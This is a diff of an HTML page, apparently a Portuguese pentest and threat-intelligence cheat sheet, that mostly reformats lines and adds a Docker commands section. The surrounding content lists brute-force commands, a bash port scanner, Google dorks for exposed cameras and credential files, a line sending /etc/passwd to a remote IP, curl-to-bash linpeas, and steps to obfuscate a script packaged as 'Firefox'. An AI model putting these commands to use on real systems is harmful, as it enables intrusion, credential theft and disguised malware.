@@ -110,7 +110,7 @@
                 <button onclick="showModalIncluse('wazuh')">Ver Detalhes</button>
             </div>
 
-             <!-- note 4 -->
+            <!-- note 4 -->
             <div class="note-card3">
                 <h3>Drupal</h3>
                 <button onclick="showModalIncluse('drupal')">Ver Detalhes</button>
@@ -186,16 +186,22 @@
 
             <div class="note-card2">
                 <h1>Sites Úteis</h1>
-                <p><strong><a href="https://haveibeenpwned.com/" target="_blank">Have I Been Pwned</a></strong> - Verifica se seus dados foram comprometidos em vazamentos.</p>
+                <p><strong><a href="https://haveibeenpwned.com/" target="_blank">Have I Been Pwned</a></strong> -
+                    Verifica se seus dados foram comprometidos em vazamentos.</p>
             </div>
 
             <div class="note-card2">
                 <h1>Ferramentas de CTI</h1>
-                <p><strong><a href="https://dev.urlquery.net" target="_blank">URLQuery</a></strong> - Análise de URLs.</p>
-                <p><strong><a href="https://urlscan.io" target="_blank">URLScan</a></strong> - Escaneamento de URLs.</li>
-                <p><strong><a href="https://www.virustotal.com" target="_blank">VirusTotal</a></strong> - Análise de arquivos e URLs.</p>
-                <p><strong><a href="https://www.urlvoid.com/" target="_blank">URLVoid</a></strong> - Verificação de reputação de URLs.</p>
-                <p><strong><a href="https://sitecheck.sucuri.net/" target="_blank">Sucuri SiteCheck</a></strong> - Verificação de segurança de sites.</p>
+                <p><strong><a href="https://dev.urlquery.net" target="_blank">URLQuery</a></strong> - Análise de URLs.
+                </p>
+                <p><strong><a href="https://urlscan.io" target="_blank">URLScan</a></strong> - Escaneamento de URLs.
+                    </li>
+                <p><strong><a href="https://www.virustotal.com" target="_blank">VirusTotal</a></strong> - Análise de
+                    arquivos e URLs.</p>
+                <p><strong><a href="https://www.urlvoid.com/" target="_blank">URLVoid</a></strong> - Verificação de
+                    reputação de URLs.</p>
+                <p><strong><a href="https://sitecheck.sucuri.net/" target="_blank">Sucuri SiteCheck</a></strong> -
+                    Verificação de segurança de sites.</p>
             </div>
 
 
@@ -280,8 +286,10 @@
                 <p><strong>Observar conexões ativas - </strong>ss -tulnp</p>
                 <br>
                 <p><strong>Descoberta de Rede (ARP) - </strong>sudo netdiscover</p>
-                <p><strong>PingSweep</strong> - (for ip in 192.168.1.{1..254}; do (ping -c 1 -W 1 $ip > /dev/null 2>&1 && echo "$ip está ativo") & done; wait) 2>/dev/null</p>
-                <p><strong>PortScanner</strong> - (for port in {1..65535}; do (echo > /dev/tcp/<IP_ALVO>/$port) 2>/dev/null && echo "Porta $port aberta" & done; wait) 2>/dev/null</p>
+                <p><strong>PingSweep</strong> - (for ip in 192.168.1.{1..254}; do (ping -c 1 -W 1 $ip > /dev/null 2>&1
+                    && echo "$ip está ativo") & done; wait) 2>/dev/null</p>
+                <p><strong>PortScanner</strong> - (for port in {1..65535}; do (echo > /dev/tcp/<IP_ALVO>/$port)
+                        2>/dev/null && echo "Porta $port aberta" & done; wait) 2>/dev/null</p>
                 <p><strong>Verificar Tabela Arp - - </strong>cat /proc/net/arp</p>
 
 
@@ -363,10 +371,13 @@
             <!-- note 1 -->
             <div class="note-card2">
                 <h1>Baixar Sites</h1>
-                <p><strong>Com WGET (SinglePage) - </strong>wget --mirror --convert-links --adjust-extension --page-requisites https://URL</p>
-                <p><strong>Com WGET (FullPage) - </strong>wget -e robots=off -mpEk --span-hosts --no-parent --domains bootstrapmade.com https://URL</p>
+                <p><strong>Com WGET (SinglePage) - </strong>wget --mirror --convert-links --adjust-extension
+                    --page-requisites https://URL</p>
+                <p><strong>Com WGET (FullPage) - </strong>wget -e robots=off -mpEk --span-hosts --no-parent --domains
+                    bootstrapmade.com https://URL</p>
                 <p><strong>Com CURL - </strong>curl -O https://URL</p>
-                <p><strong>Com /dev/tcp - </strong>exec 3<> /dev/tcp/IP_REMOTO/PORTA ;echo -e "GET / HTTP/1.1\r\nHost: IP_REMOTO\r\nConnection: close\r\n\r\n" >&3; cat <&3> NOME_ARQUIVO</p>
+                <p><strong>Com /dev/tcp - </strong>exec 3<> /dev/tcp/IP_REMOTO/PORTA ;echo -e "GET / HTTP/1.1\r\nHost:
+                        IP_REMOTO\r\nConnection: close\r\n\r\n" >&3; cat <&3> NOME_ARQUIVO</p>
             </div>
 
             <div class="note-card2">
@@ -382,7 +393,8 @@
                 <p><strong>Hydra - Ataque de força bruta em SSH:</strong></p>
                 <p><code>hydra -l usuario -P /caminho/para/wordlist.txt ssh://IP_ALVO</code></p>
                 <p><strong>Hydra - Ataque de força bruta em HTTP:</strong></p>
-                <p><code>hydra -l usuario -P /caminho/para/wordlist.txt IP_ALVO http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"</code></p>
+                <p><code>hydra -l usuario -P /caminho/para/wordlist.txt IP_ALVO http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"</code>
+                </p>
                 <p><strong>Medusa - Ataque de força bruta em FTP:</strong></p>
                 <p><code>medusa -h IP_ALVO -u usuario -P /caminho/para/wordlist.txt -M ftp</code></p>
                 <p><strong>John The Ripper - Força bruta em hashes:</strong></p>
@@ -391,7 +403,7 @@
                 <p><code>hashcat -m 0 -a 0 hash.txt /caminho/para/wordlist.txt</code></p>
                 <p><strong>WFuzz - Força bruta em parâmetros de URL:</strong></p>
                 <p><code>wfuzz -c -z file,/caminho/para/wordlist.txt --hc 404 http://IP_ALVO/FUZZ</code></p>
-                
+
             </div>
 
 
@@ -410,7 +422,7 @@
                 <p>cat arquivo.txt</p>
                 <p><strong>Exibir conteúdo do arquivo em ordem inversa:</strong></p>
                 <p>tac arquivo.txt</p>
-                
+
             </div>
 
             <div class="note-card2">
@@ -424,7 +436,7 @@
                 <p><strong>Shell Backdoor com While True:</strong></p>
                 <p><code>exec 3<>/dev/tcp/192.168.0.10/4545; cat /etc/passwd >&3; exec 3<&-; exec 3>&-</p></code>
             </div>
-            
+
             <!-- note 1 -->
             <div class="note-card2">
                 <h1>Dados de Conexão</h1>
@@ -447,114 +459,114 @@
 
 
 
+            <div class="note-card2">
+                <h1>Google Dorks</h1>
+                <p><strong>Finding exposed directories:</strong></p>
+                <p><code>intitle:"Index of" -inurl:(jsp|pl|php|html|aspx|htm|cf|shtml) </code></p>
+                <p><code>-inurl:(listen77|mp3raid|mp3toss|mp3drug|index_of|wallywashis)</code></p>
+                <p><strong>Discovering open webcams:</strong></p>
+                <p><code>inurl:"viewerframe?mode=motion"</code></p>
 
-        <div class="note-card2">
-            <h1>Google Dorks</h1>
-            <p><strong>Finding exposed directories:</strong></p>
-            <p><code>intitle:"Index of" -inurl:(jsp|pl|php|html|aspx|htm|cf|shtml) </code></p>
-            <p><code>-inurl:(listen77|mp3raid|mp3toss|mp3drug|index_of|wallywashis)</code></p>
-            <p><strong>Discovering open webcams:</strong></p>
-            <p><code>inurl:"viewerframe?mode=motion"</code></p>
+                <p><strong>Finding email lists:</strong></p>
+                <p><code>filetype:txt @gmail.com OR @yahoo.com OR @hotmail.com OR @aol.com</code></p>
 
-            <p><strong>Finding email lists:</strong></p>
-            <p><code>filetype:txt @gmail.com OR @yahoo.com OR @hotmail.com OR @aol.com</code></p>
+                <p><strong>Uncovering vulnerable web servers:</strong></p>
+                <p><code>intitle:"Welcome to Windows 2000 Internet Services"</code></p>
 
-            <p><strong>Uncovering vulnerable web servers:</strong></p>
-            <p><code>intitle:"Welcome to Windows 2000 Internet Services"</code></p>
+                <p><strong>Discovering exposed CCTV cameras:</strong></p>
+                <p><code>inurl:ViewerFrame?Mode=Motion</code></p>
 
-            <p><strong>Discovering exposed CCTV cameras:</strong></p>
-            <p><code>inurl:ViewerFrame?Mode=Motion</code></p>
+                <p><strong>Finding SQL injection vulnerabilities:</strong></p>
+                <p><code>inurl:index.php?id=</code></p>
 
-            <p><strong>Finding SQL injection vulnerabilities:</strong></p>
-            <p><code>inurl:index.php?id=</code></p>
+                <p><strong>Uncovering sensitive information in files:</strong></p>
+                <p><code>intitle:"Index of" password.txt</code></p>
 
-            <p><strong>Uncovering sensitive information in files:</strong></p>
-            <p><code>intitle:"Index of" password.txt</code></p>
+                <p><strong>Discovering login pages:</strong></p>
+                <p><code>inurl:admin/login</code></p>
 
-            <p><strong>Discovering login pages:</strong></p>
-            <p><code>inurl:admin/login</code></p>
+                <p><strong>Finding exposed databases:</strong></p>
+                <p><code>intext:"phpMyAdmin" "running on" inurl:"main.php"</code></p>
 
-            <p><strong>Finding exposed databases:</strong></p>
-            <p><code>intext:"phpMyAdmin" "running on" inurl:"main.php"</code></p>
+                <p><strong>Discovering vulnerable WordPress sites:</strong></p>
+                <p><code>inurl:/wp-content/plugins/revslider/</code></p>
 
-            <p><strong>Discovering vulnerable WordPress sites:</strong></p>
-            <p><code>inurl:/wp-content/plugins/revslider/</code></p>
+                <p><strong>Finding open FTP servers:</strong></p>
+                <p><code>intitle:"index of" inurl:ftp</code></p>
 
-            <p><strong>Finding open FTP servers:</strong></p>
-            <p><code>intitle:"index of" inurl:ftp</code></p>
+                <p><strong>Discovering exposed configuration files:</strong></p>
+                <p><code>intitle:"index of" config.yml</code></p>
 
-            <p><strong>Discovering exposed configuration files:</strong></p>
-            <p><code>intitle:"index of" config.yml</code></p>
+                <p><strong>Finding open Git repositories:</strong></p>
+                <p><code>intitle:index of .git</code></p>
 
-            <p><strong>Finding open Git repositories:</strong></p>
-            <p><code>intitle:index of .git</code></p>
+                <p><strong>Discovering vulnerable Joomla installations:</strong></p>
+                <p><code>inurl:/index.php?option=com_joomla</code></p>
 
-            <p><strong>Discovering vulnerable Joomla installations:</strong></p>
-            <p><code>inurl:/index.php?option=com_joomla</code></p>
+                <p><strong>Finding sensitive files:</strong></p>
+                <p><code>intitle:"index of" password OR passcode OR passphrase OR keyfile</code></p>
 
-            <p><strong>Finding sensitive files:</strong></p>
-            <p><code>intitle:"index of" password OR passcode OR passphrase OR keyfile</code></p>
+                <p><strong>Discovering exposed MongoDB instances:</strong></p>
+                <p><code>intitle:"mongodb status" intext:"topologyVersion"</code></p>
 
-            <p><strong>Discovering exposed MongoDB instances:</strong></p>
-            <p><code>intitle:"mongodb status" intext:"topologyVersion"</code></p>
+                <p><strong>Finding open network devices:</strong></p>
+                <p><code>intitle:"open network devices"</code></p>
 
-            <p><strong>Finding open network devices:</strong></p>
-            <p><code>intitle:"open network devices"</code></p>
+                <p><strong>Discovering exposed subdomains:</strong></p>
+                <p><code>site:\*.example.com -www</code></p>
 
-            <p><strong>Discovering exposed subdomains:</strong></p>
-            <p><code>site:\*.example.com -www</code></p>
+                <p><strong>Finding vulnerable Apache Tomcat installations:</strong></p>
+                <p><code>intitle:"Apache Tomcat" intext:"If you're seeing this, you've successfully installed Tomcat"</code>
+                </p>
 
-            <p><strong>Finding vulnerable Apache Tomcat installations:</strong></p>
-            <p><code>intitle:"Apache Tomcat" intext:"If you're seeing this, you've successfully installed Tomcat"</code></p>
+                <p><strong>Discovering exposed GitLab repositories:</strong></p>
+                <p><code>intitle:"GitLab"</code></p>
 
-            <p><strong>Discovering exposed GitLab repositories:</strong></p>
-            <p><code>intitle:"GitLab"</code></p>
+                <p><strong>Finding exposed server directories:</strong></p>
+                <p><code>intitle:"index of" /admin</code></p>
 
-            <p><strong>Finding exposed server directories:</strong></p>
-            <p><code>intitle:"index of" /admin</code></p>
+                <p><strong>Discovering sensitive Google Drive files:</strong></p>
+                <p><code>site:drive.google.com confidential</code></p>
 
-            <p><strong>Discovering sensitive Google Drive files:</strong></p>
-            <p><code>site:drive.google.com confidential</code></p>
+                <p><strong>Finding exposed Jenkins instances:</strong></p>
+                <p><code>intitle:"Dashboard [Jenkins]"</code></p>
 
-            <p><strong>Finding exposed Jenkins instances:</strong></p>
-            <p><code>intitle:"Dashboard [Jenkins]"</code></p>
+                <p><strong>Discovering exposed AWS S3 buckets:</strong></p>
+                <p><code>site:s3.amazonaws.com</code></p>
 
-            <p><strong>Discovering exposed AWS S3 buckets:</strong></p>
-            <p><code>site:s3.amazonaws.com</code></p>
+                <p><strong>Finding vulnerable Magento installations:</strong></p>
+                <p><code>inurl:/index.php/admin</code></p>
 
-            <p><strong>Finding vulnerable Magento installations:</strong></p>
-            <p><code>inurl:/index.php/admin</code></p>
+                <p><strong>Discovering exposed log files:</strong></p>
+                <p><code>intitle:"index of" error.log</code></p>
 
-            <p><strong>Discovering exposed log files:</strong></p>
-            <p><code>intitle:"index of" error.log</code></p>
+                <p><strong>Finding open Elasticsearch instances:</strong></p>
+                <p><code>intitle:"Kibana" intext:"Welcome to Elastic"</code></p>
 
-            <p><strong>Finding open Elasticsearch instances:</strong></p>
-            <p><code>intitle:"Kibana" intext:"Welcome to Elastic"</code></p>
+                <p><strong>Discovering exposed API keys:</strong></p>
+                <p><code>filetype:env intext:API_KEY</code></p>
 
-            <p><strong>Discovering exposed API keys:</strong></p>
-            <p><code>filetype:env intext:API_KEY</code></p>
+                <p><strong>Finding exposed phpMyAdmin installations:</strong></p>
+                <p><code>inurl:"phpmyadmin/index.php"</code></p>
 
-            <p><strong>Finding exposed phpMyAdmin installations:</strong></p>
-            <p><code>inurl:"phpmyadmin/index.php"</code></p>
+                <p><strong>Discovering vulnerable OpenCart installations:</strong></p>
+                <p><code>inurl:/admin/config.php</code></p>
 
-            <p><strong>Discovering vulnerable OpenCart installations:</strong></p>
-            <p><code>inurl:/admin/config.php</code></p>
+                <p><strong>Finding exposed sensitive documents:</strong></p>
+                <p><code>filetype:pdf "Confidential"</code></p>
 
-            <p><strong>Finding exposed sensitive documents:</strong></p>
-            <p><code>filetype:pdf "Confidential"</code></p>
+                <p><strong>Discovering exposed network devices:</strong></p>
+                <p><code>intitle:"Device name" inurl:home.htm</code></p>
 
-            <p><strong>Discovering exposed network devices:</strong></p>
-            <p><code>intitle:"Device name" inurl:home.htm</code></p>
+                <p><strong>Finding open RDP (Remote Desktop Protocol) servers:</strong></p>
+                <p><code>intitle:"Remote Desktop Web Connection"</code></p>
 
-            <p><strong>Finding open RDP (Remote Desktop Protocol) servers:</strong></p>
-            <p><code>intitle:"Remote Desktop Web Connection"</code></p>
+                <p><strong>Discovering exposed Firebase databases:</strong></p>
+                <p><code>intitle:"Firebase Console - Projects"</code></p>
 
-            <p><strong>Discovering exposed Firebase databases:</strong></p>
-            <p><code>intitle:"Firebase Console - Projects"</code></p>
-
-            <p><strong>Finding vulnerable Drupal installations:</strong></p>
-            <p><code>inurl:"/user/login" "Powered by Drupal"</code></p>
-        </div>
+                <p><strong>Finding vulnerable Drupal installations:</strong></p>
+                <p><code>inurl:"/user/login" "Powered by Drupal"</code></p>
+            </div>
 
 
             <!-- note 1 -->
@@ -564,21 +576,58 @@
                     https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash</p>
             </div>
 
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Estabilizar Conexão</h1>
-                <p><strong>Reverse Shell - </strong> <a href="https://www.revshells.com/"
-                        target="_blank">https://www.revshells.com/</a></p>
-            </div>
+            <div class="note-card2"></div>
+            <h1>Docker Commands</h1>
+            <h2>📦 Containers</h2>
+            <p><strong>Listar containers em execução:</strong> docker ps</p>
+            <p><strong>Listar todos containers (inclusive parados):</strong> docker ps -a</p>
+            <p><strong>Iniciar container parado:</strong> docker start &lt;container_id/nome&gt;</p>
+            <p><strong>Parar container rodando:</strong> docker stop &lt;container_id/nome&gt;</p>
+            <p><strong>Reiniciar container:</strong> docker restart &lt;container_id/nome&gt;</p>
+            <p><strong>Remover container:</strong> docker rm &lt;container_id/nome&gt;</p>
+            <p><strong>Remover todos containers parados:</strong> docker container prune</p>
 
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Maware</h1>
-                <p><strong>PyArmor - </strong>pyarmor -q gen gunkey.py</p>
-                <p><strong>PyInstaller - </strong>pyinstaller -n Firefox -F gunkey.py</p>
-                <p><strong>PyArmor with Obfuscation - </strong>pyarmor gen -O obfdist --pack dist/Firefox
-                    gunkey.py</p>
-            </div>
+            <h2>📸 Imagens</h2>
+            <p><strong>Listar imagens locais:</strong> docker images ou docker image ls</p>
+            <p><strong>Baixar imagem do Docker Hub:</strong> docker pull &lt;imagem&gt;:&lt;tag&gt;</p>
+            <p><strong>Enviar imagem para o Docker Hub:</strong> docker push &lt;imagem&gt;:&lt;tag&gt;</p>
+            <p><strong>Remover imagem específica:</strong> docker rmi &lt;imagem&gt;:&lt;tag&gt;</p>
+            <p><strong>Remover todas imagens sem container associado:</strong> docker image prune</p>
+            <p><strong>Remover todas imagens do host:</strong> docker rmi $(docker images -q)</p>
+
+            <h2>🌐 Redes</h2>
+            <p><strong>Listar redes:</strong> docker network ls</p>
+            <p><strong>Criar nova rede:</strong> docker network create &lt;nome_rede&gt;</p>
+            <p><strong>Inspecionar rede:</strong> docker network inspect &lt;nome_rede&gt;</p>
+            <p><strong>Remover rede:</strong> docker network rm &lt;nome_rede&gt;</p>
+
+            <h2>🔧 Extras</h2>
+            <p><strong>Ver logs do container:</strong> docker logs &lt;container_id/nome&gt;</p>
+            <p><strong>Executar comando dentro do container:</strong> docker exec -it &lt;container_id/nome&gt;
+                /bin/bash</p>
+            <p><strong>Build de imagem via Dockerfile:</strong> docker build -t &lt;nome_imagem&gt;:&lt;tag&gt; .</p>
+            <p><strong>Parar todos os containers:</strong> docker stop $(docker ps -q)</p>
+            <p><strong>Remover todos os containers:</strong> docker rm $(docker ps -aq)</p>
+            <p><strong>Limpar tudo (containers, imagens, volumes e redes não usadas):</strong> docker system prune -a
+            </p>
+        </div>
+
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Estabilizar Conexão</h1>
+            <p><strong>Reverse Shell - </strong> <a href="https://www.revshells.com/"
+                    target="_blank">https://www.revshells.com/</a></p>
+        </div>
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Maware</h1>
+            <p><strong>PyArmor - </strong>pyarmor -q gen gunkey.py</p>
+            <p><strong>PyInstaller - </strong>pyinstaller -n Firefox -F gunkey.py</p>
+            <p><strong>PyArmor with Obfuscation - </strong>pyarmor gen -O obfdist --pack dist/Firefox
+                gunkey.py</p>
+        </div>
         </div>
 
         <div class="note-card2">
@@ -768,7 +817,7 @@
                 --proxy-https --proxy-https-port 443 -P POST</p>
             <p>sudo wifiphisher -nD -i wlan0</p>
             <p>sudo wifite --bully --kill</p>
-    
+
         </div>
 
         <!-- note 1 -->
@@ -789,13 +838,13 @@
 
 
             <div class="note-card2"></div>
-                <h1>Gerar Wordlists com CUPP</h1>
-                <p><strong>Instalar CUPP:</strong></p>
-                <p>sudo apt install cupp</p>
-                <p>cupp -i</p>
-                <p><strong>Combinar wordlists:</strong></p>
-                <p>cupp -w</p>
-            </div>
+            <h1>Gerar Wordlists com CUPP</h1>
+            <p><strong>Instalar CUPP:</strong></p>
+            <p>sudo apt install cupp</p>
+            <p>cupp -i</p>
+            <p><strong>Combinar wordlists:</strong></p>
+            <p>cupp -w</p>
+        </div>
         </div>
 
 
